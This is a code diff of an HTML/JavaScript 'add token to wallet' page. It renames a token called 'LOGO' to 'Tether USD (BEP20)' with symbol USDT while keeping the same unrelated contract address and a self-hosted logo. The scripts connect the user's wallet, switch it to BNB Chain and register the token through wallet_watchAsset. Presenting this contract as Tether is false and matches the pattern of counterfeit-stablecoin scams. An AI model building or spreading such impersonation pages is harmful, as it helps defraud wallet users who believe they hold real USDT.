@@ -5,33 +5,55 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Add Tether USD to Wallet</title>
 <style>
+  :root {
+    --brand-green: #00c78b;
+    --dark-bg: #0b121f;
+    --card-bg: #111b2b;
+    --text-light: #e9eefc;
+    --text-muted: #9da6bf;
+  }
+
   body {
     font-family: system-ui, sans-serif;
-    background: linear-gradient(145deg, #0b1220, #10182d);
-    color: #e9eefc;
+    background: radial-gradient(circle at top, var(--dark-bg), #060a13);
+    color: var(--text-light);
     text-align: center;
     margin: 0;
     padding: 60px 20px;
   }
+
   .card {
-    background: #121a2b;
+    background: var(--card-bg);
     display: inline-block;
     padding: 40px 50px;
-    border-radius: 20px;
-    box-shadow: 0 0 20px rgba(0,0,0,0.4);
-    max-width: 480px;
+    border-radius: 22px;
+    box-shadow: 0 0 25px rgba(0,0,0,0.4);
+    max-width: 520px;
+    transition: 0.3s;
   }
+  .card:hover {
+    box-shadow: 0 0 35px rgba(0,255,170,0.25);
+  }
+
   .logo {
-    width: 96px; height: 96px; border-radius: 50%; margin-bottom: 20px;
+    width: 96px;
+    height: 96px;
+    border-radius: 50%;
+    margin-bottom: 20px;
+    border: 3px solid var(--brand-green);
+    box-shadow: 0 0 12px rgba(0,255,170,0.2);
   }
-  h1 { margin: 10px 0; }
-  p { color: #b7bdd6; }
+
+  h1 { margin: 10px 0; font-weight: 600; }
+  p { color: var(--text-muted); }
+
   .buttons {
     display: flex;
     flex-direction: column;
     gap: 12px;
     margin-top: 25px;
   }
+
   button {
     border: none;
     border-radius: 10px;
@@ -41,61 +63,239 @@
     color: #fff;
     transition: 0.2s;
   }
+
+  .connect { background: var(--brand-green); }
   .mm { background: #f6851b; }
-  .tw { background: #3375bb; }
+  .tw { background: #3aa9f4; }
   .cb { background: #1652f0; }
-  button:hover { opacity: 0.85; transform: translateY(-2px); }
-  #msg { margin-top: 25px; color: #9db3ff; }
+  .switch { background: #ffb703; }
+  .check { background: #1dba6c; }
+
+  button:hover {
+    opacity: 0.9;
+    transform: translateY(-2px);
+    box-shadow: 0 0 12px rgba(0,255,170,0.25);
+  }
+
+  #networkInfo { margin-bottom: 10px; }
+  #msg { margin-top: 25px; color: #9db3ff; min-height: 22px; }
+
+  /* Toast Notification */
+  #toast {
+    visibility: hidden;
+    min-width: 260px;
+    margin-left: -130px;
+    background-color: #2c334a;
+    color: #fff;
+    text-align: center;
+    border-radius: 12px;
+    padding: 16px;
+    position: fixed;
+    z-index: 100;
+    left: 50%;
+    bottom: 30px;
+    font-size: 15px;
+    box-shadow: 0 4px 16px rgba(0,0,0,0.4);
+    transition: visibility 0s, opacity 0.3s ease, bottom 0.3s ease;
+    opacity: 0;
+  }
+  #toast.show {
+    visibility: visible;
+    bottom: 50px;
+    opacity: 1;
+  }
+  #toast.success { background-color: var(--brand-green); }
+  #toast.error { background-color: #f44336; }
+  #toast.info { background-color: #2196f3; }
 </style>
 </head>
 <body>
   <div class="card">
     <img src="https://yyoutoone-art.github.io/logo-token-page/logo.png" class="logo" alt="LOGO" />
-    <h1>LOGO Token (BEP20)</h1>
+    <h1>Tether USD (BEP20)</h1>
     <p>Contract: <code>0xBb7e20348fCFD959e314747873b41d51Ef1f3474</code></p>
+    <p id="networkInfo">🌐 Network: Not connected</p>
 
-    <div class="buttons">
-      <button class="mm" onclick="addToken('metamask')"> Add to MetaMask</button>
-      <button class="tw" onclick="addToken('trustwallet')"> Add to TrustWallet</button>
-      <button class="cb" onclick="addToken('coinbase')"> Add to Coinbase Wallet</button>
-    </div>
-
+    <div id="buttons" class="buttons"></div>
+    <button class="check" onclick="checkIfAdded()">🔍 Check if Token is Added</button>
     <p id="msg"></p>
   </div>
+
+  <!-- Toast -->
+  <div id="toast"></div>
 
   <script>
     const token = {
       address: "0xBb7e20348fCFD959e314747873b41d51Ef1f3474",
-      symbol: "LOGO",
+      symbol: "USDT",
       decimals: 18,
       image: "https://yyoutoone-art.github.io/logo-token-page/logo.png"
     };
 
-    async function addToken(wallet) {
-      const msg = document.getElementById('msg');
-      if (!window.ethereum) {
-        msg.innerHTML = "⚠️ Please open this page in your wallet’s DApp browser.";
-        return;
-      }
+    const BSC_MAINNET = {
+      chainId: "0x38",
+      chainName: "BNB Smart Chain",
+      nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+      rpcUrls: ["https://bsc-dataseed.binance.org/"],
+      blockExplorerUrls: ["https://bscscan.com/"]
+    };
 
+    const msg = document.getElementById("msg");
+    const buttons = document.getElementById("buttons");
+    const networkInfo = document.getElementById("networkInfo");
+    let connectedAccount = null;
+    let currentChainId = null;
+
+    // 🧃 Toast Notification
+    function showToast(message, type = "info") {
+      const toast = document.getElementById("toast");
+      toast.className = `show ${type}`;
+      toast.textContent = message;
+      setTimeout(() => {
+        toast.className = toast.className.replace("show", "");
+      }, 3000);
+    }
+
+    // 🔍 Wallet Detection
+    function detectWallet() {
+      const eth = window.ethereum;
+      if (!eth) return "unknown";
+      if (eth.isMetaMask) return "metamask";
+      if (eth.isTrust) return "trustwallet";
+      if (eth.isCoinbaseWallet) return "coinbase";
+      return "unknown";
+    }
+
+    function createButton(label, css, action) {
+      const btn = document.createElement("button");
+      btn.textContent = label;
+      btn.className = css;
+      btn.onclick = action;
+      buttons.appendChild(btn);
+    }
+
+    // 🔗 Connect Wallet
+    async function connectWallet() {
       try {
-        if (wallet === 'metamask' || wallet === 'trustwallet') {
-          const wasAdded = await window.ethereum.request({
-            method: 'wallet_watchAsset',
-            params: {
-              type: 'ERC20',
-              options: token
-            },
-          });
-          msg.innerHTML = wasAdded ? "✅ Token added to " + wallet + "." : "❌ Cancelled by user.";
-        } else if (wallet === 'coinbase') {
-          msg.innerHTML = "ℹ️ Please open this link in your Coinbase Wallet browser.";
+        const eth = window.ethereum;
+        if (!eth) {
+          showToast("⚠️ No wallet detected.", "error");
+          return;
         }
-      } catch (e) {
-        console.error(e);
-        msg.innerHTML = "⚠️ Error adding token. Try again.";
+        const accounts = await eth.request({ method: "eth_requestAccounts" });
+        connectedAccount = accounts[0];
+        currentChainId = await eth.request({ method: "eth_chainId" });
+        showToast("✅ Wallet Connected", "success");
+        updateNetworkDisplay();
+        renderButtons();
+      } catch (err) {
+        showToast("❌ Connection cancelled", "error");
       }
     }
+
+    function updateNetworkDisplay() {
+      if (!currentChainId) {
+        networkInfo.innerText = "🌐 Network: Not connected";
+        return;
+      }
+      let name = "Unknown";
+      switch (currentChainId) {
+        case "0x38": name = "BNB Smart Chain (Mainnet)"; break;
+        case "0x61": name = "BNB Smart Chain (Testnet)"; break;
+        case "0x1": name = "Ethereum Mainnet"; break;
+        default: name = "Chain ID: " + currentChainId;
+      }
+      networkInfo.innerText = "🌐 Network: " + name;
+    }
+
+    async function switchToBSC() {
+      try {
+        await ethereum.request({
+          method: "wallet_addEthereumChain",
+          params: [BSC_MAINNET]
+        });
+        currentChainId = "0x38";
+        updateNetworkDisplay();
+        showToast("✅ Switched to BNB Chain", "success");
+        renderButtons();
+      } catch (e) {
+        showToast("⚠️ Failed to switch network", "error");
+      }
+    }
+
+    async function addToken(wallet) {
+      try {
+        const wasAdded = await window.ethereum.request({
+          method: "wallet_watchAsset",
+          params: { type: "ERC20", options: token },
+        });
+        if (wasAdded) showToast(`✅ Token added to ${wallet}`, "success");
+        else showToast("❌ Cancelled by user", "error");
+      } catch (error) {
+        console.error(error);
+        showToast("⚠️ Error adding token", "error");
+      }
+    }
+
+    async function checkIfAdded() {
+      try {
+        if (!window.ethereum) return showToast("⚠️ Wallet not found", "error");
+        if (!connectedAccount) return showToast("⚠️ Connect wallet first", "info");
+        const balance = await ethereum.request({
+          method: "eth_call",
+          params: [
+            {
+              to: token.address,
+              data: "0x70a08231000000000000000000000000" + connectedAccount.substring(2),
+            },
+            "latest",
+          ],
+        });
+        const hasBalance = parseInt(balance, 16) > 0;
+        showToast(
+          hasBalance ? "✅ Token already in your wallet" : "❌ Token not found",
+          hasBalance ? "success" : "error"
+        );
+      } catch (err) {
+        console.error(err);
+        showToast("⚠️ Could not verify token", "error");
+      }
+    }
+
+    function renderButtons() {
+      buttons.innerHTML = "";
+      if (!connectedAccount) {
+        createButton("🔗 Connect Wallet", "connect", connectWallet);
+        return;
+      }
+      if (currentChainId !== "0x38") {
+        createButton("🔄 Switch to BNB Chain", "switch", switchToBSC);
+        return;
+      }
+      const wallet = detectWallet();
+      if (wallet === "metamask") createButton("Add to MetaMask", "mm", () => addToken(wallet));
+      else if (wallet === "trustwallet") createButton("Add to Trust Wallet", "tw", () => addToken(wallet));
+      else if (wallet === "coinbase") createButton("Add to Coinbase Wallet", "cb", () => addToken(wallet));
+      else {
+        createButton("Add to MetaMask", "mm", () => addToken("metamask"));
+        createButton("Add to Trust Wallet", "tw", () => addToken("trustwallet"));
+        createButton("Add to Coinbase Wallet", "cb", () => addToken("coinbase"));
+      }
+    }
+
+    if (window.ethereum) {
+      ethereum.on("chainChanged", (chainId) => {
+        currentChainId = chainId;
+        updateNetworkDisplay();
+        renderButtons();
+      });
+      ethereum.on("accountsChanged", (accounts) => {
+        connectedAccount = accounts.length ? accounts[0] : null;
+        renderButtons();
+      });
+    }
+
+    renderButtons();
   </script>
 </body>
 </html>
